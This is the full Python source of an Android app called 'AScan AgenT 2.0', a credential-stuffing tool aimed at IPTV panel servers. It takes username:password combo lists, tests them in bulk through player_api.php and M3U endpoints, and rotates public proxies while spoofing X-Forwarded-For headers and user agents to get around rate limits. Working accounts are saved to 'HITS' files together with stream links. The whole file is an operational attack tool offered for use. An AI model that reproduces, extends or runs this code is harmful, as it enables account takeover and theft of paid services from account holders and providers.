# -*- coding: utf-8 -*-
"""
AScan AgenT 2.0 - Android
"""
import os
import sys
import time
import datetime
import threading
import queue
import random
import re
import socket
import json

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.popup import Popup
from kivy.uix.spinner import Spinner
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.properties import BooleanProperty, StringProperty
from kivy.graphics import Color, RoundedRectangle, Rectangle
from kivy.utils import get_color_from_hex
from kivy.metrics import dp

C = {
    'bg': '#0B0F14',
    'card': '#12181F',
    'card2': '#1A222D',
    'line': '#2A3441',
    'text': '#E6EDF3',
    'muted': '#8B9BB0',
    'blue': '#3B82F6',
    'green': '#22C55E',
    'orange': '#F59E0B',
    'red': '#EF4444',
    'input': '#0A0E14',
}

REPO_OWNER = 'StartStatic1'
REPO_NAME = 'AScan-AgenT-2.0-'
REPO_BRANCH = 'main'
COMBOS_API = 'https://api.github.com/repos/%s/%s/contents/combos' % (REPO_OWNER, REPO_NAME)
COMBOS_RAW = 'https://raw.githubusercontent.com/%s/%s/%s/combos/' % (REPO_OWNER, REPO_NAME, REPO_BRANCH)

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    requests = None

try:
    import dns.resolver
    DNS_OK = True
except ImportError:
    DNS_OK = False

def storage_root():
    for c in [
        os.environ.get('EXTERNAL_STORAGE'),
        '/storage/emulated/0',
        '/sdcard',
        os.path.expanduser('~'),
    ]:
        if c and os.path.isdir(c):
            return c
    return os.path.expanduser('~')

BASE = storage_root()
OUT_DIR = os.path.join(BASE, 'AScan_AgenT')
HITS_DIR = os.path.join(OUT_DIR, 'HITS')
COMBO_HITS = os.path.join(OUT_DIR, 'COMBO')
for d in (OUT_DIR, HITS_DIR, COMBO_HITS):
    try:
        os.makedirs(d, exist_ok=True)
    except Exception:
        pass

_pause = threading.Event()
_stop = threading.Event()
_lock = threading.Lock()
_file_lock = threading.Lock()
COMBO_NAME = ''
STATS = {'hits': 0, 'hits_ilimitados': 0}
SESS = {}
SESS_L = threading.Lock()
DNS_C = {}
DNS_L = threading.Lock()
PROXIES = []
PROXY_L = threading.Lock()
PROXY_I = 0

UAS = [
    'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/131.0.0.0 Mobile Safari/537.36',
    'TiviMate/4.7.0 (Android 11)',
    'okhttp/5.2.0',
]

def headers():
    h = {
        'User-Agent': random.choice(UAS),
        'Accept': '*/*',
        'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
    }
    ip = '%d.%d.%d.%d' % tuple(random.randint(1, 255) for _ in range(4))
    h['X-Forwarded-For'] = ip
    return h

def next_proxy():
    with PROXY_L:
        if not PROXIES:
            return None
        global PROXY_I
        p = PROXIES[PROXY_I % len(PROXIES)]
        PROXY_I += 1
        return p

def parse_proxy_text(text):
    out = []
    for line in (text or '').splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if '://' in line:
            out.append(line)
        elif '@' in line:
            out.append('http://' + line)
        elif line.count(':') >= 1:
            out.append('http://' + line)
    return out

def download_proxies_online():
    urls = [
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all',
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
        'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
    ]
    found = []
    if not requests:
        return found
    for u in urls:
        try:
            r = requests.get(u, timeout=12)
            if r.status_code == 200 and r.text:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and not line.startswith('#') and ':' in line and ' ' not in line:
                        if '://' not in line:
                            line = 'http://' + line
                        found.append(line)
            if len(found) >= 80:
                break
        except Exception:
            continue
    seen = set()
    uniq = []
    for p in found:
        if p not in seen:
            seen.add(p)
            uniq.append(p)
    return uniq[:200]

def session(server=None, proxy=None):
    if requests is None:
        raise RuntimeError('requests nao disponivel')
    key = '%s_%s' % (server, proxy)
    with SESS_L:
        if key in SESS and time.time() - SESS[key][1] < 300:
            return SESS[key][0]
    s = requests.Session()
    s.headers.update(headers())
    if proxy:
        s.proxies = {'http': proxy, 'https': proxy}
    with SESS_L:
        SESS[key] = (s, time.time())
    return s

def dns_ip(host):
    with DNS_L:
        e = DNS_C.get(host)
        if e and time.time() - e['t'] < 1800:
            return e['ip']
    ip = None
    if DNS_OK:
        try:
            r = dns.resolver.Resolver()
            r.timeout = r.lifetime = 2
            for a in r.resolve(host, 'A'):
                ip = str(a)
                break
        except Exception:
            pass
    if not ip:
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            pass
    if ip:
        with DNS_L:
            DNS_C[host] = {'ip': ip, 't': time.time()}
    return ip

def norm_server(s):
    s = (s or '').strip()
    for p in ('https://', 'http://', 'HTTP://', 'HTTPS://'):
        if s.startswith(p):
            s = s[len(p):]
    return s.rstrip('/')

def fetch_json(url, timeout=10, server=None, proxy=None):
    last_code = 0
    last_err = 'fail'
    for i in range(3):
        try:
            s = session(server, proxy)
            s.headers.update(headers())
            if i:
                time.sleep(random.uniform(0.4, 1.2) * i)
            r = s.get(url, timeout=timeout, verify=False, allow_redirects=True)
            last_code = r.status_code
            if r.status_code == 200:
                try:
                    return r.json(), 200, 'ok'
                except Exception:
                    return None, 200, 'bad_json'
            if r.status_code in (403, 429, 503, 520, 521, 522) and i < 2:
                last_err = 'http_%d' % r.status_code
                time.sleep(random.uniform(1, 2.5))
                continue
            return None, r.status_code, 'http_%d' % r.status_code
        except Exception as e:
            last_err = type(e).__name__
            if i < 2:
                time.sleep(0.4)
    return None, last_code, last_err

def check_target(server, item, timeout=8, proxy=None):
    user, pwd = item
    server = norm_server(server)
    url = 'http://%s/player_api.php?username=%s&password=%s' % (server, user, pwd)
    data, code, err = fetch_json(url, timeout=timeout, server=server, proxy=proxy)
    meta = {'code': code, 'err': err, 'server': server}
    if data:
        st = str(data.get('user_info', {}).get('status', '')).lower()
        if st in ('active', '1', 'true', 'ok'):
            meta['err'] = 'hit'
            return True, data, meta
        meta['err'] = 'inactive'
        return False, data, meta
    try:
        m3u = 'http://%s/get.php?username=%s&password=%s&type=m3u_plus&output=ts' % (server, user, pwd)
        r = session(server, proxy).get(m3u, timeout=timeout, verify=False)
        meta['code'] = r.status_code
        if r.status_code == 200 and r.content:
            body = r.content.decode('utf-8', errors='ignore') if isinstance(r.content, bytes) else str(r.content)
            if '#EXTM3U' in body or '#EXTINF' in body:
                meta['err'] = 'hit_m3u'
                return True, {'user_info': {'status': 'active'}, 'm3u_fallback': True}, meta
        if r.status_code in (403, 429, 503):
            meta['err'] = 'http_%d' % r.status_code
    except Exception as e:
        meta['err'] = type(e).__name__
    return False, {}, meta

def fetch_counts(server, user, pwd):
    try:
        server = norm_server(server)
        b = 'http://%s/player_api.php?username=%s&password=%s' % (server, user, pwd)
        a, _, _ = fetch_json(b + '&action=get_live_streams', server=server)
        f, _, _ = fetch_json(b + '&action=get_vod_streams', server=server)
        s, _, _ = fetch_json(b + '&action=get_series', server=server)
        return len(a or []), len(f or []), len(s or [])
    except Exception:
        return 0, 0, 0

def geo_lookup(ip):
    try:
        r = requests.get('http://ip-api.com/json/%s?fields=status,country,countryCode,city,isp' % ip, timeout=6)
        j = r.json()
        if j.get('status') == 'success':
            return j
    except Exception:
        pass
    return {}

def build_hit(server, item, data):
    user, pwd = item
    server = norm_server(server)
    ui = data.get('user_info', {})
    host = server.split(':')[0]
    port = server.split(':')[1] if ':' in server else '80'
    ip = dns_ip(host) or ''
    g = geo_lookup(ip) if ip else {}
    geo = ', '.join(x for x in [g.get('city'), g.get('country')] if x) or 'N/A'
    canais, filmes, series = fetch_counts(server, user, pwd)
    exp = ui.get('exp_date', '0')
    ilim = exp in ('0', 'null', 'None', '')
    if not ilim:
        try:
            dias = int((int(exp) - time.time()) / 86400)
            if dias > 365:
                ilim = True
        except Exception:
            ilim = True
    exp_s = 'Ilimitado'
    if not ilim:
        try:
            exp_s = datetime.datetime.fromtimestamp(int(exp)).strftime('%d/%m/%Y')
        except Exception:
            pass
    m3u = 'http://%s/get.php?username=%s&password=%s&type=m3u_plus&output=ts' % (server, user, pwd)
    txt = (
        'AScan AgenT 2.0 [HIT]\n'
        'Servidor  -> http://%s\n'
        'DNS       -> %s:%s\n'
        'Local     -> %s\n'
        '--------------------------\n'
        'Usuario   -> %s\n'
        'Senha     -> %s\n'
        'Status    -> ONLINE\n'
        'Plano     -> %s\n'
        'Conexoes  -> %s/%s\n'
        'Expira    -> %s\n'
        'Canais/Filmes/Series -> %d/%d/%d\n'
        '--------------------------\n'
        'M3U -> %s\n'
        'Combo -> %s\n'
    ) % (
        server, host, port, geo, user, pwd,
        'ILIMITADO' if ilim else 'PREMIUM',
        ui.get('active_cons', '0'), ui.get('max_connections', '1'),
        exp_s, canais, filmes, series, m3u, COMBO_NAME,
    )
    return txt, ilim

def save_hit(server, texto, ilim=False):
    try:
        with _file_lock:
            host = server.split(':')[0].replace('.', '_')
            fn = '%s_%s.txt' % (datetime.datetime.now().strftime('%d-%m'), host)
            block = '[%s]\n%s\n\n' % (datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S'), texto)
            for path in (
                os.path.join(HITS_DIR, fn),
                os.path.join(HITS_DIR, 'HITS_GERAL.txt'),
            ):
                with open(path, 'a', encoding='utf-8') as f:
                    f.write(block)
            if ilim:
                with open(os.path.join(HITS_DIR, 'ILIMITADOS.txt'), 'a', encoding='utf-8') as f:
                    f.write(block)
            STATS['hits'] += 1
            if ilim:
                STATS['hits_ilimitados'] += 1
            return True
    except Exception:
        return False

def save_combo_line(server, user, pwd):
    try:
        with _file_lock:
            host = server.split(':')[0].replace('.', '_')
            with open(os.path.join(COMBO_HITS, host + '.txt'), 'a', encoding='utf-8') as f:
                f.write('%s:%s\n' % (user, pwd))
    except Exception:
        pass

def parse_combo_text(text):
    items = []
    for line in (text or '').splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if ':' in line:
            u, p = line.split(':', 1)
            u, p = u.strip(), p.strip()
            if u and p:
                items.append((u, p))
    return items

def hex_c(k):
    return get_color_from_hex(C[k])

class RCard(BoxLayout):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.orientation = 'vertical'
        self.padding = [dp(14), dp(12), dp(14), dp(12)]
        self.spacing = dp(10)
        self.size_hint_y = None
        self.bind(minimum_height=self.setter('height'))
        with self.canvas.before:
            Color(*hex_c('card'))
            self.bg = RoundedRectangle(pos=self.pos, size=self.size, radius=[dp(12)])
        self.bind(pos=self._u, size=self._u)

    def _u(self, *a):
        self.bg.pos = self.pos
        self.bg.size = self.size

class Btn(Button):
    def __init__(self, text='', kind='blue', **kw):
        h = kw.pop('height', dp(46))
        kw['text'] = text if text != '' else kw.get('text', '')
        super().__init__(**kw)
        self.background_normal = ''
        self.background_down = ''
        m = {'blue': 'blue', 'green': 'green', 'orange': 'orange', 'red': 'red', 'dark': 'card2'}
        self.background_color = hex_c(m.get(kind, 'blue'))
        self.color = (1, 1, 1, 1)
        self.bold = True
        self.font_size = '14sp'
        self.size_hint_y = None
        self.height = h

class Inp(TextInput):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.background_color = hex_c('input')
        self.foreground_color = hex_c('text')
        self.cursor_color = hex_c('blue')
        self.hint_text_color = hex_c('muted')
        self.padding = [dp(12), dp(12)]
        self.font_size = '14sp'
        self.multiline = False
        self.size_hint_y = None
        self.height = dp(46)

class T(Label):
    def __init__(self, text='', size=14, muted=False, bold=False, **kw):
        super().__init__(**kw)
        self.text = ('[b]%s[/b]' % text) if bold else text
        self.markup = True
        self.color = hex_c('muted' if muted else 'text')
        self.font_size = '%dsp' % size
        self.size_hint_y = None
        self.height = dp(24)
        self.halign = 'left'
        self.valign = 'middle'
        self.bind(size=lambda i, v: setattr(i, 'text_size', v))

class LogBox(Label):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.color = hex_c('text')
        self.font_size = '12sp'
        self.halign = 'left'
        self.valign = 'top'
        self.markup = True
        self.size_hint_y = None
        self.bind(texture_size=self._h, width=self._w)

    def _w(self, *a):
        self.text_size = (max(self.width - 4, 10), None)

    def _h(self, *a):
        self.height = max(self.texture_size[1] + 8, dp(40))

class AScanApp(App):
    scan_running = BooleanProperty(False)
    scan_paused = BooleanProperty(False)
    status_txt = StringProperty('[color=22C55E]*[/color] Pronto')

    def __init__(self, **kw):
        super().__init__(**kw)
        self.combo_items = []
        self.stats = {'hits': 0, 'checks': 0, 'start': 0}
        self.scan_thread = None
        self.clock = None
        Window.clearcolor = hex_c('bg')
        try:
            Window.softinput_mode = 'below_target'
        except Exception:
            pass

    def build(self):
        root = BoxLayout(orientation='vertical', padding=[dp(12), dp(10), dp(12), dp(10)], spacing=dp(8))
        head = BoxLayout(size_hint_y=None, height=dp(40))
        title = Label(text='[b]AScan[/b] AgenT 2.0', markup=True, font_size='20sp',
                      color=hex_c('blue'), halign='left', valign='middle', size_hint_x=0.7)
        title.bind(size=lambda i, v: setattr(i, 'text_size', v))
        self.lbl_status = Label(text=self.status_txt, markup=True, font_size='12sp',
                                halign='right', valign='middle', size_hint_x=0.3)
        self.lbl_status.bind(size=lambda i, v: setattr(i, 'text_size', v))
        head.add_widget(title)
        head.add_widget(self.lbl_status)
        root.add_widget(head)

        sc = ScrollView(do_scroll_x=False, bar_width=dp(4))
        body = GridLayout(cols=1, spacing=dp(10), size_hint_y=None, padding=[0, 0, 0, dp(8)])
        body.bind(minimum_height=body.setter('height'))

        card = RCard()
        card.add_widget(T('SERVIDORES', size=12, muted=True, bold=True))
        self.srv = []
        for i in range(5):
            e = Inp(hint_text='host:porta  (sem http://)')
            self.srv.append(e)
            card.add_widget(e)
        tip_s = T('Pode colar com http:// — o app remove automaticamente', size=11, muted=True)
        tip_s.height = dp(20)
        card.add_widget(tip_s)
        body.add_widget(card)

        card = RCard()
        card.add_widget(T('COMBO', size=12, muted=True, bold=True))
        self.lbl_combo = T('Nenhum combo carregado', size=13, muted=True)
        self.lbl_combo.height = dp(28)
        card.add_widget(self.lbl_combo)
        row = BoxLayout(size_hint_y=None, height=dp(46), spacing=dp(8))
        b1 = Btn('GitHub', kind='blue')
        b1.bind(on_press=self.open_github_combos)
        b2 = Btn('Colar texto', kind='dark')
        b2.bind(on_press=self.open_paste_combo)
        row.add_widget(b1)
        row.add_widget(b2)
        card.add_widget(row)
        body.add_widget(card)

        card = RCard()
        card.add_widget(T('PROXIES', size=12, muted=True, bold=True))
        self.lbl_proxy = T('Sem proxy (direto)', size=13, muted=True)
        self.lbl_proxy.height = dp(26)
        card.add_widget(self.lbl_proxy)
        rowp = BoxLayout(size_hint_y=None, height=dp(42), spacing=dp(6))
        bp1 = Btn('Online', kind='blue', height=dp(42))
        bp1.bind(on_press=self.load_proxies_online)
        bp2 = Btn('Colar', kind='dark', height=dp(42))
        bp2.bind(on_press=self.open_paste_proxy)
        bp3 = Btn('Limpar', kind='red', height=dp(42))
        bp3.bind(on_press=self.clear_proxies)
        rowp.add_widget(bp1)
        rowp.add_widget(bp2)
        rowp.add_widget(bp3)
        card.add_widget(rowp)
        body.add_widget(card)

        card = RCard()
        card.add_widget(T('CONFIG', size=12, muted=True, bold=True))
        r1 = BoxLayout(size_hint_y=None, height=dp(46), spacing=dp(8))
        r1.add_widget(T('Modo', size=13, size_hint_x=0.28))
        self.modo = Spinner(
            text='Adaptativo',
            values=['Padrao', 'Adaptativo', 'Furtivo', 'Camaleao', 'Bypass Intenso'],
            size_hint_x=0.72, background_normal='', background_color=hex_c('input'),
            color=hex_c('text'), font_size='14sp',
        )
        r1.add_widget(self.modo)
        card.add_widget(r1)
        r2 = BoxLayout(size_hint_y=None, height=dp(46), spacing=dp(8))
        r2.add_widget(T('Threads', size=13, size_hint_x=0.28))
        self.threads = Inp(text='20', size_hint_x=0.72, input_filter='int')
        r2.add_widget(self.threads)
        card.add_widget(r2)
        body.add_widget(card)

        card = RCard()
        card.add_widget(T('STATS', size=12, muted=True, bold=True))
        grid = GridLayout(cols=2, spacing=dp(6), size_hint_y=None, height=dp(110))
        self.sl = {}
        for k, v in [
            ('checks', 'Checks  0'), ('hits', 'Hits  0'),
            ('ilim', 'Ilimitados  0'), ('cpm', 'CPM  0'),
            ('tempo', 'Tempo  00:00'), ('ncombo', 'Combo  0'),
            ('errs', '403:0 429:0 TO:0'), ('px', 'Proxies  0'),
        ]:
            lb = T(v, size=12)
            lb.height = dp(24)
            self.sl[k] = lb
            grid.add_widget(lb)
        card.add_widget(grid)
        self.sl['per'] = T('Servidores: -', size=11, muted=True)
        self.sl['per'].height = dp(36)
        card.add_widget(self.sl['per'])
        self.sl['path'] = T('Hits: %s' % HITS_DIR, size=10, muted=True)
        self.sl['path'].height = dp(22)
        card.add_widget(self.sl['path'])
        body.add_widget(card)

        card = RCard()
        card.add_widget(T('LOG', size=12, muted=True, bold=True))
        self.log = LogBox(text='Pronto. Carregue um combo para comecar.')
        card.add_widget(self.log)
        body.add_widget(card)

        sc.add_widget(body)
        root.add_widget(sc)

        bar = BoxLayout(size_hint_y=None, height=dp(50), spacing=dp(8))
        self.btn_go = Btn('INICIAR', kind='green')
        self.btn_go.bind(on_press=self.start_scan)
        self.btn_pause = Btn('PAUSAR', kind='orange')
        self.btn_pause.bind(on_press=self.toggle_pause)
        self.btn_stop = Btn('PARAR', kind='red')
        self.btn_stop.bind(on_press=self.stop_scan)
        bar.add_widget(self.btn_go)
        bar.add_widget(self.btn_pause)
        bar.add_widget(self.btn_stop)
        root.add_widget(bar)
        return root

    def log_msg(self, msg):
        ts = datetime.datetime.now().strftime('%H:%M:%S')
        line = '[%s] %s' % (ts, msg)
        cur = self.log.text
        if cur.startswith('Pronto.'):
            self.log.text = line
        else:
            lines = (cur + '\n' + line).split('\n')
            self.log.text = '\n'.join(lines[-50:])

    def set_combo(self, items, name):
        global COMBO_NAME
        self.combo_items = items
        COMBO_NAME = name
        self.lbl_combo.text = '%s  ·  %d contas' % (name, len(items))
        self.lbl_combo.color = hex_c('green')
        self.sl['ncombo'].text = 'Combo  %d' % len(items)
        self.log_msg('Combo: %s (%d)' % (name, len(items)))

    def set_proxies(self, items, label):
        global PROXIES, PROXY_I
        with PROXY_L:
            PROXIES = list(items)
            PROXY_I = 0
        n = len(items)
        self.lbl_proxy.text = '%s  ·  %d proxies' % (label, n) if n else 'Sem proxy (direto)'
        self.lbl_proxy.color = hex_c('green' if n else 'muted')
        if 'px' in self.sl:
            self.sl['px'].text = 'Proxies  %d' % n
        self.log_msg('Proxies: %s (%d)' % (label, n))

    def clear_proxies(self, *_):
        self.set_proxies([], 'limpo')

    def load_proxies_online(self, *_):
        self.log_msg('Baixando proxies online...')
        def work(dt):
            try:
                items = download_proxies_online()
                if not items:
                    self.log_msg('Nenhum proxy online encontrado')
                    return
                self.set_proxies(items, 'online')
            except Exception as e:
                self.log_msg('Proxy online falhou: %s' % e)
        Clock.schedule_once(work, 0.05)

    def open_paste_proxy(self, *_):
        box = BoxLayout(orientation='vertical', spacing=dp(8), padding=dp(10))
        box.add_widget(T('Cole ip:porta (uma por linha)', size=12, muted=True))
        ti = TextInput(
            hint_text='1.2.3.4:8080\nuser:pass@1.2.3.4:3128',
            background_color=hex_c('input'),
            foreground_color=hex_c('text'),
            cursor_color=hex_c('blue'),
            font_size='13sp',
            multiline=True,
        )
        box.add_widget(ti)
        btn = Btn('Carregar proxies', kind='green')
        box.add_widget(btn)
        pop = Popup(title='Colar proxies', content=box, size_hint=(0.94, 0.7))

        def ok(_):
            items = parse_proxy_text(ti.text)
            if not items:
                self.log_msg('Nenhum proxy valido')
                return
            self.set_proxies(items, 'colado')
            pop.dismiss()
        btn.bind(on_press=ok)
        pop.open()

    def open_paste_combo(self, *_):
        box = BoxLayout(orientation='vertical', spacing=dp(8), padding=dp(10))
        box.add_widget(T('Cole linhas user:senha (uma por linha)', size=12, muted=True))
        ti = TextInput(
            hint_text='user1:pass1\nuser2:pass2',
            background_color=hex_c('input'),
            foreground_color=hex_c('text'),
            cursor_color=hex_c('blue'),
            font_size='13sp',
            multiline=True,
        )
        box.add_widget(ti)
        btn = Btn('Carregar', kind='green')
        box.add_widget(btn)
        pop = Popup(title='Colar combo', content=box, size_hint=(0.94, 0.7))

        def ok(_):
            items = parse_combo_text(ti.text)
            if not items:
                self.log_msg('Nenhuma linha valida (use user:senha)')
                return
            self.set_combo(items, 'colado')
            pop.dismiss()
        btn.bind(on_press=ok)
        pop.open()

    def open_github_combos(self, *_):
        box = BoxLayout(orientation='vertical', spacing=dp(8), padding=dp(10))
        box.add_widget(T('Combos no GitHub (pasta combos/)', size=12, muted=True))
        status = T('Carregando lista...', size=12, muted=True)
        box.add_widget(status)
        scroll = ScrollView(size_hint_y=1)
        lst = GridLayout(cols=1, spacing=dp(6), size_hint_y=None, padding=[0, 4, 0, 4])
        lst.bind(minimum_height=lst.setter('height'))
        scroll.add_widget(lst)
        box.add_widget(scroll)
        btn_refresh = Btn('Atualizar lista', kind='dark', height=dp(42))
        box.add_widget(btn_refresh)
        pop = Popup(title='Combos GitHub', content=box, size_hint=(0.94, 0.85))

        def load_list(*_a):
            lst.clear_widgets()
            status.text = 'Buscando...'
            def work(dt):
                try:
                    if not requests:
                        status.text = 'requests indisponivel'
                        return
                    r = requests.get(COMBOS_API, timeout=15, headers={'Accept': 'application/vnd.github+json'})
                    if r.status_code != 200:
                        status.text = 'Erro API %s' % r.status_code
                        return
                    files = [f for f in r.json() if f.get('type') == 'file' and f.get('name', '').lower().endswith(('.txt', '.csv', '.list'))]
                    if not files:
                        status.text = 'Nenhum .txt em combos/'
                        return
                    status.text = '%d arquivo(s)' % len(files)
                    for f in sorted(files, key=lambda x: x['name'].lower()):
                        name = f['name']
                        b = Btn(name, kind='dark', height=dp(44))
                        b.bind(on_press=lambda btn, n=name, url=f.get('download_url'): self._dl_combo(n, url, pop))
                        lst.add_widget(b)
                except Exception as e:
                    status.text = 'Falha: %s' % e
            Clock.schedule_once(work, 0.05)

        btn_refresh.bind(on_press=load_list)
        load_list()
        pop.open()

    def _dl_combo(self, name, url, pop):
        self.log_msg('Baixando %s...' % name)
        def work(dt):
            try:
                u = url or (COMBOS_RAW + name)
                r = requests.get(u, timeout=60)
                if r.status_code != 200:
                    self.log_msg('Download falhou (%s)' % r.status_code)
                    return
                items = parse_combo_text(r.text)
                if not items:
                    self.log_msg('Arquivo sem linhas user:senha')
                    return
                self.set_combo(items, name)
                pop.dismiss()
            except Exception as e:
                self.log_msg('Erro download: %s' % e)
        Clock.schedule_once(work, 0.05)

    def start_scan(self, *_):
        if self.scan_running:
            return
        raw = [e.text.strip() for e in self.srv if e.text.strip()]
        servers = [norm_server(s) for s in raw]
        servers = [s for s in servers if s]
        if not servers:
            self.log_msg('Informe ao menos 1 servidor')
            return
        if not self.combo_items:
            self.log_msg('Carregue um combo (GitHub ou colar)')
            return
        try:
            th = int(self.threads.text.strip() or '20')
        except Exception:
            th = 20
        th = max(1, min(th, 80))
        self.scan_running = True
        self.scan_paused = False
        _pause.clear()
        _stop.clear()
        self.stats = {
            'hits': 0, 'checks': 0, 'start': time.time(),
            'pause_acc': 0.0, 'pause_at': None,
            'err403': 0, 'err429': 0, 'timeout': 0, 'other': 0,
            'per': {s: {'ok': 0, 'hit': 0, 'err': 0, 'last': '-'} for s in servers},
        }
        self.lbl_status.text = '[color=F59E0B]*[/color] Rodando'
        self.btn_go.disabled = True
        for s in servers:
            self.log_msg('SRV %s' % s)
        self.log_msg('Hits em: %s' % HITS_DIR)
        with PROXY_L:
            np = len(PROXIES)
        self.log_msg('Proxies: %d | Start %d srv | %d combo | %d thr' % (
            np, len(servers), len(self.combo_items), th))
        self.scan_thread = threading.Thread(
            target=self._worker, args=(servers, list(self.combo_items), th), daemon=True)
        self.scan_thread.start()
        self.clock = Clock.schedule_interval(self._tick, 0.5)

    def _worker(self, servers, items, th):
        q = queue.Queue()
        for it in items:
            q.put(it)

        def one(server):
            while not _stop.is_set():
                if _pause.is_set():
                    time.sleep(0.2)
                    continue
                try:
                    item = q.get_nowait()
                except queue.Empty:
                    break
                try:
                    px = next_proxy()
                    ok, data, meta = check_target(server, item, proxy=px)
                    err = meta.get('err', '')
                    code = meta.get('code', 0)
                    with _lock:
                        self.stats['checks'] += 1
                        ps = self.stats['per'].setdefault(server, {'ok': 0, 'hit': 0, 'err': 0, 'last': '-'})
                        if ok:
                            ps['hit'] += 1
                            ps['last'] = 'HIT'
                        else:
                            ps['ok'] += 1
                            ps['last'] = err or str(code)
                            if '403' in str(err) or code == 403:
                                self.stats['err403'] += 1
                                ps['err'] += 1
                            elif '429' in str(err) or code == 429:
                                self.stats['err429'] += 1
                                ps['err'] += 1
                            elif err in ('Timeout', 'ConnectTimeout', 'ReadTimeout', 'ConnectionError'):
                                self.stats['timeout'] += 1
                                ps['err'] += 1
                            elif err not in ('inactive', 'ok', 'bad_json'):
                                self.stats['other'] += 1
                    if ok:
                        texto, ilim = build_hit(server, item, data)
                        save_hit(server, texto, ilim)
                        save_combo_line(server, item[0], item[1])
                        with _lock:
                            self.stats['hits'] += 1
                        tag = 'ILIM' if ilim else 'HIT'
                        Clock.schedule_once(
                            lambda dt, s=server, u=item[0], tg=tag: self.log_msg('%s %s | %s  -> HITS/' % (tg, s, u)), 0)
                    else:
                        with _lock:
                            n = self.stats['checks']
                        if n % 25 == 0 and err:
                            Clock.schedule_once(
                                lambda dt, s=server, e=err, c=code: self.log_msg('%s -> %s (%s)' % (s, e, c)), 0)
                except Exception:
                    with _lock:
                        self.stats['other'] += 1
                finally:
                    try:
                        q.task_done()
                    except Exception:
                        pass

        pool = []
        per = max(1, th // max(len(servers), 1))
        for s in servers:
            for _ in range(per):
                t = threading.Thread(target=one, args=(s,), daemon=True)
                t.start()
                pool.append(t)
        for t in pool:
            t.join()
        Clock.schedule_once(lambda dt: self._done(), 0)

    def _done(self):
        self.scan_running = False
        self.btn_go.disabled = False
        self.lbl_status.text = '[color=22C55E]*[/color] Pronto'
        self.log_msg('Fim | Hits %d | Checks %d | 403=%d 429=%d TO=%d' % (
            self.stats['hits'], self.stats['checks'],
            self.stats.get('err403', 0), self.stats.get('err429', 0), self.stats.get('timeout', 0)))
        if self.clock:
            self.clock.cancel()

    def _tick(self, dt):
        now = time.time()
        pause_acc = self.stats.get('pause_acc', 0.0)
        if self.scan_paused and self.stats.get('pause_at'):
            pause_acc = pause_acc + (now - self.stats['pause_at'])
        el = max(now - self.stats['start'] - pause_acc, 1)
        cpm = (self.stats['checks'] / el) * 60 if not self.scan_paused else self.stats.get('_last_cpm', 0)
        if not self.scan_paused:
            self.stats['_last_cpm'] = cpm
        m, s = int(el // 60), int(el % 60)
        self.sl['checks'].text = 'Checks  %d' % self.stats['checks']
        self.sl['hits'].text = 'Hits  %d' % self.stats['hits']
        self.sl['ilim'].text = 'Ilimitados  %d' % STATS.get('hits_ilimitados', 0)
        self.sl['cpm'].text = 'CPM  %.0f' % cpm
        self.sl['tempo'].text = 'Tempo  %02d:%02d%s' % (m, s, ' (P)' if self.scan_paused else '')
        e403 = self.stats.get('err403', 0)
        e429 = self.stats.get('err429', 0)
        eto = self.stats.get('timeout', 0)
        if 'errs' in self.sl:
            self.sl['errs'].text = '403:%d 429:%d TO:%d' % (e403, e429, eto)
        if 'path' in self.sl:
            self.sl['path'].text = 'Hits: %s' % HITS_DIR
        if 'px' in self.sl:
            with PROXY_L:
                np = len(PROXIES)
            self.sl['px'].text = 'Proxies  %d' % np
        if 'per' in self.sl and self.stats.get('per'):
            parts = []
            for srv, st in list(self.stats['per'].items())[:5]:
                short = srv.split(':')[0][:14]
                parts.append('%s h%d/%s' % (short, st.get('hit', 0), st.get('last', '-')))
            self.sl['per'].text = ' | '.join(parts) if parts else 'Servidores: -'

    def toggle_pause(self, *_):
        if not self.scan_running:
            return
        if self.scan_paused:
            if self.stats.get('pause_at'):
                self.stats['pause_acc'] = self.stats.get('pause_acc', 0) + (time.time() - self.stats['pause_at'])
                self.stats['pause_at'] = None
            _pause.clear()
            self.scan_paused = False
            self.btn_pause.text = 'PAUSAR'
            self.lbl_status.text = '[color=F59E0B]*[/color] Rodando'
            self.log_msg('Retomado')
        else:
            self.stats['pause_at'] = time.time()
            _pause.set()
            self.scan_paused = True
            self.btn_pause.text = 'RETOMAR'
            self.lbl_status.text = '[color=E3B341]*[/color] Pausado'
            self.log_msg('Pausado')

    def stop_scan(self, *_):
        if not self.scan_running:
            return
        _stop.set()
        _pause.clear()
        self.scan_running = False
        self.scan_paused = False
        self.btn_go.disabled = False
        self.btn_pause.text = 'PAUSAR'
        self.lbl_status.text = '[color=22C55E]*[/color] Pronto'
        self.log_msg('Parado')
        if self.clock:
            self.clock.cancel()


if __name__ == '__main__':
    AScanApp().run()
